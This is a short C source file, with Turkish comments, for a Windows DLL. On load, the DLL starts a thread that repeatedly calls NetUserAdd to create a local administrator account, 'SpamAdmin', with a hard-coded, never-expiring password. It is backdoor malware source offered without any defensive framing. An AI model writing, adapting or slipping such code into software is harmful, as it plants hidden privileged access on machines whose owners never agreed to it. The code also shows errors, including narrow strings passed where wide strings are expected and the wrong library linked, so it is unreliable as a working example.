#include <Windows.h>
#include <Lmcons.h>
#include <Security.h>

#pragma comment(lib, "advapi32.lib")

DWORD WINAPI CreateSpamAdmins(LPVOID lpParameter)
{
    // Kullanıcı adı ve parola için gerekli yapılandırma
    char* username = "SpamAdmin";
    char* password = "SpamPassword";

    // Kullanıcı oluşturma için gerekli yapılandırma
    USER_INFO_1 ui;
    ui.usri1_name = username;
    ui.usri1_password = password;
    ui.usri1_priv = USER_PRIV_ADMIN;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;

    // Kullanıcı oluşturma
    while (TRUE)
    {
        NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
        Sleep(1000); // 1 saniye bekleyelim
    }

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, 0, CreateSpamAdmins, NULL, 0, NULL);
        break;
    }

    return TRUE;
}
